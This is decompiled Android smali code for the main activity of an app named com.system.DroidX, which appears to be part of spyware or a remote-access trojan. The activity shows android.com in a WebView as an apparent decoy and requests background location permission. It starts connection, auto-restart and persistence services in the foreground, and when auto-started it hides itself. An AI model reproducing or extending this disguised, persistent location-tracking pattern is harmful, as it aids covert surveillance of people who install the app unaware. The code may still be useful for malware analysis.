.class public Lcom/system/DroidX/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# static fields
.field private static final OFFICIAL_WEBSITE:Ljava/lang/String; = "https://www.android.com/"


# instance fields
.field private progressBar:Landroid/widget/ProgressBar;

.field private webView:Landroid/webkit/WebView;


# direct methods
.method static bridge synthetic -$$Nest$fgetprogressBar(Lcom/system/DroidX/MainActivity;)Landroid/widget/ProgressBar;
    .locals 0

    iget-object p0, p0, Lcom/system/DroidX/MainActivity;->progressBar:Landroid/widget/ProgressBar;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetwebView(Lcom/system/DroidX/MainActivity;)Landroid/webkit/WebView;
    .locals 0

    iget-object p0, p0, Lcom/system/DroidX/MainActivity;->webView:Landroid/webkit/WebView;

    return-object p0
.end method

.method public constructor <init>()V
    .locals 0

    .line 14
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method private checkBackgroundLocationPermission()V
    .locals 1

    .line 81
    invoke-static {p0}, Lcom/system/DroidX/utils/PermissionHelper;->hasLocationPermissions(Landroid/app/Activity;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 82
    invoke-static {p0}, Lcom/system/DroidX/utils/PermissionHelper;->hasBackgroundLocationPermission(Landroid/app/Activity;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 84
    invoke-static {p0}, Lcom/system/DroidX/utils/PermissionHelper;->requestBackgroundLocationPermission(Landroid/app/Activity;)V

    return-void

    .line 86
    :cond_0
    invoke-direct {p0}, Lcom/system/DroidX/MainActivity;->startConnectionService()V

    return-void

    .line 89
    :cond_1
    invoke-direct {p0}, Lcom/system/DroidX/MainActivity;->startConnectionService()V

    return-void
.end method

.method private setupWebView()V
    .locals 2

    .line 50
    iget-object v0, p0, Lcom/system/DroidX/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    const/4 v1, 0x1

    .line 51
    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 52
    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    .line 53
    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    .line 54
    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    const/4 v1, 0x0

    .line 55
    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 56
    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setDisplayZoomControls(Z)V

    const/4 v1, -0x1

    .line 57
    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    .line 60
    iget-object v0, p0, Lcom/system/DroidX/MainActivity;->webView:Landroid/webkit/WebView;

    new-instance v1, Lcom/system/DroidX/MainActivity$1;

    invoke-direct {v1, p0}, Lcom/system/DroidX/MainActivity$1;-><init>(Lcom/system/DroidX/MainActivity;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 77
    iget-object v0, p0, Lcom/system/DroidX/MainActivity;->webView:Landroid/webkit/WebView;

    const-string v1, "https://www.android.com/"

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    return-void
.end method

.method private startConnectionService()V
    .locals 3

    .line 117
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/system/DroidX/ConnectionService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 118
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_0

    .line 119
    invoke-virtual {p0, v0}, Lcom/system/DroidX/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 121
    :cond_0
    invoke-virtual {p0, v0}, Lcom/system/DroidX/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 125
    :goto_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/system/DroidX/AutoRestartService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 126
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v1, v2, :cond_1

    .line 127
    invoke-virtual {p0, v0}, Lcom/system/DroidX/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_1

    .line 129
    :cond_1
    invoke-virtual {p0, v0}, Lcom/system/DroidX/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 133
    :goto_1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/system/DroidX/utils/PersistentService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 134
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v1, v2, :cond_2

    .line 135
    invoke-virtual {p0, v0}, Lcom/system/DroidX/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void

    .line 137
    :cond_2
    invoke-virtual {p0, v0}, Lcom/system/DroidX/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    .line 108
    invoke-super {p0, p1, p2, p3}, Landroidx/appcompat/app/AppCompatActivity;->onActivityResult(IILandroid/content/Intent;)V

    const/16 p2, 0x65

    if-ne p1, p2, :cond_0

    .line 111
    invoke-direct {p0}, Lcom/system/DroidX/MainActivity;->checkBackgroundLocationPermission()V

    :cond_0
    return-void
.end method

.method public onBackPressed()V
    .locals 1

    .line 144
    iget-object v0, p0, Lcom/system/DroidX/MainActivity;->webView:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/webkit/WebView;->canGoBack()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 145
    iget-object v0, p0, Lcom/system/DroidX/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->goBack()V

    return-void

    .line 147
    :cond_0
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2

    .line 21
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 22
    sget p1, Lcom/system/DroidX/R$layout;->activity_main:I

    invoke-virtual {p0, p1}, Lcom/system/DroidX/MainActivity;->setContentView(I)V

    .line 25
    sget p1, Lcom/system/DroidX/R$id;->webView:I

    invoke-virtual {p0, p1}, Lcom/system/DroidX/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/webkit/WebView;

    iput-object p1, p0, Lcom/system/DroidX/MainActivity;->webView:Landroid/webkit/WebView;

    .line 26
    sget p1, Lcom/system/DroidX/R$id;->progressBar:I

    invoke-virtual {p0, p1}, Lcom/system/DroidX/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/ProgressBar;

    iput-object p1, p0, Lcom/system/DroidX/MainActivity;->progressBar:Landroid/widget/ProgressBar;

    .line 29
    invoke-virtual {p0}, Lcom/system/DroidX/MainActivity;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const-string v0, "auto_start"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 33
    invoke-direct {p0}, Lcom/system/DroidX/MainActivity;->startConnectionService()V

    const/4 p1, 0x1

    .line 35
    invoke-virtual {p0, p1}, Lcom/system/DroidX/MainActivity;->moveTaskToBack(Z)Z

    return-void

    .line 38
    :cond_0
    invoke-direct {p0}, Lcom/system/DroidX/MainActivity;->setupWebView()V

    .line 40
    invoke-static {p0}, Lcom/system/DroidX/utils/PermissionHelper;->hasPermissions(Landroid/app/Activity;)Z

    move-result p1

    if-eqz p1, :cond_1

    .line 41
    invoke-direct {p0}, Lcom/system/DroidX/MainActivity;->checkBackgroundLocationPermission()V

    return-void

    .line 43
    :cond_1
    invoke-static {p0}, Lcom/system/DroidX/utils/PermissionHelper;->requestPermissions(Landroid/app/Activity;)V

    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 0

    .line 95
    invoke-super {p0, p1, p2, p3}, Landroidx/appcompat/app/AppCompatActivity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 p2, 0x64

    if-ne p1, p2, :cond_0

    .line 99
    invoke-direct {p0}, Lcom/system/DroidX/MainActivity;->checkBackgroundLocationPermission()V

    return-void

    :cond_0
    const/16 p2, 0x66

    if-ne p1, p2, :cond_1

    .line 102
    invoke-direct {p0}, Lcom/system/DroidX/MainActivity;->startConnectionService()V

    :cond_1
    return-void
.end method
